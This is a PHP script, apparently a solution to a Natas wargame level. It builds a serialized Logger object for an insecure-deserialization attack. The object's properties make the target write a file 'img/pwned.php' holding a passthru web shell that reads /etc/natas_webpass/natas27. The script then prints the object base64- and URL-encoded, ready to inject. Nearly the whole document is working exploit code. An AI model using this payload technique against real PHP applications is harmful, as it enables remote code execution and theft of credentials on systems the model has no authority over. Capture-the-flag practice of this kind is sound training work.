<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--been here--#\n";
            $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27'); ?>";
            $this->logFile = "img/pwned.php";
        }

        function __destruct(){
          echo "__destruct...!";
          echo $this->logFile;
          echo $this->exitMsg;
        }
    }

$obj = new Logger("foo");
echo urlencode(base64_encode(serialize($obj))) . "\n";
?>
